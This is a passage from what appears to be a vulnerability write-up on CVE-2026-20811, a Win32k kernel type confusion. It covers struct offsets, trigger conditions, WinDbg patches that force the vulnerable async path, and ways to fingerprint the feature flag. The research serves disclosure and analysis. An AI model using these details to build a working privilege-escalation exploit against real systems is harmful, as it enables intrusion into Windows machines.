The PoC itself does not crash the system because the `CMonitorTopology*` at +0xA8 points to a valid, reference-counted session object under normal conditions. To confirm the dereference is reachable and exploitable when the topology is invalid, I zeroed +0xA8 via a WinDbg conditional breakpoint, manually simulating a freed or corrupted topology. This is an artificially induced condition: I have not demonstrated that the topology object can be freed or replaced naturally between the post and the processing (see the exploitation considerations section for why this is hard). What the BSOD confirms is that the pointer dereference is reachable from user-mode input and that an invalid value at +0xA8 produces a controlled kernel crash, not that the full exploit chain works end-to-end.

Two WinDbg patches are required to reach the async path on build 26100.7309, simulating the production environment where the feature flag is cloud-enabled and the caller has IAM access:

```
eb win32kfull!Feature_ApplyWindowActionConvergence__private_featureState 17
eb win32kfull!IAMThreadAccessGranted b8 01 00 00 00 c3
```

## Trigger Conditions Summary

1. `Feature_ApplyWindowActionConvergence` enabled (cloud rollout on ~26100.7000+ production builds)
2. Cross-thread `NtUserApplyWindowAction` call (window owner != caller thread)
3. `IAMThreadAccessGranted` returns TRUE (UWP apps, IAM-granted contexts)
4. DPI awareness set to Per Monitor v2 (`SetProcessDpiAwarenessContext(-4)`)

### Feature Flag Observability

One open question is whether an attacker can determine if `Feature_ApplyWindowActionConvergence` is enabled before attempting the exploit. The `featureState` value lives in the `win32kfull.sys` data section and is not directly readable from user mode. There is no documented user-mode API to query Win32k feature flag state. However, the feature changes observable behavior: when the feature is enabled, cross-thread `NtUserApplyWindowAction` calls that pass `IAMThreadAccessGranted` are dispatched asynchronously (the caller returns immediately), while the legacy path processes them synchronously or rejects them. An attacker could use timing differences or return value behavior to infer whether the async path is active, making the feature state indirectly fingerprint-able from user mode without kernel read access.

## Conclusion

CVE-2026-20811 is a type confusion caused by incomplete sanitization of an internal kernel buffer passed through the Win32k async message queue. The `CMonitorTopology*` at offset +0xA8 of a 0xB8-byte `CWindowAction` buffer survives sanitization in `xxxProcessAsyncWindowAction` and is dereferenced by `xxxApplyWindowAction` on the receiving thread.

The vulnerability was introduced by a cloud-deployed feature flag (`Feature_ApplyWindowActionConvergence`) and did not exist at RTM. Microsoft's fix disables the feature flag rather than fixing the code. The vulnerable path is unchanged in the post-patch binary but unreachable because the feature is off. A safe alternative using event type 31 with a 0x60-byte allow-list copy exists in both binaries as separate infrastructure, but is not yet wired into the async dispatch path.

This means the bug is mitigated, not fixed. If `Feature_ApplyWindowActionConvergence` is re-enabled in a future update without switching the async path to the safe event type 31 handler, the type confusion returns. Worth watching.

## Acknowledgements

MSRC credits **Daniil Romanovych** for reporting this vulnerability.

## References

1. Microsoft. "CVE-2026-20811 - Windows Win32 Kernel Subsystem Elevation of Privilege Vulnerability." [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-20811](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-20811){:target="_blank"}

2. Microsoft. "January 14, 2026 - KB5074109." [https://support.microsoft.com/en-us/topic/kb5074109](https://support.microsoft.com/en-us/topic/january-13-2026-kb5074109-os-builds-26200-7623-and-26100-7623-3ec427dd-6fc4-4c32-a471-83504dd081cb){:target="_blank"}

3. zynamics/Google. "BinDiff." [https://www.zynamics.com/bindiff.html](https://www.zynamics.com/bindiff.html){:target="_blank"}

4. Microsoft. "SetProcessDpiAwarenessContext function." [https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setprocessdpiawarenesscontext](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setprocessdpiawarenesscontext){:target="_blank"}

5. MITRE. "CWE-843: Access of Resource Using Incompatible Type ('Type Confusion')." [https://cwe.mitre.org/data/definitions/843.html](https://cwe.mitre.org/data/definitions/843.html){:target="_blank"}
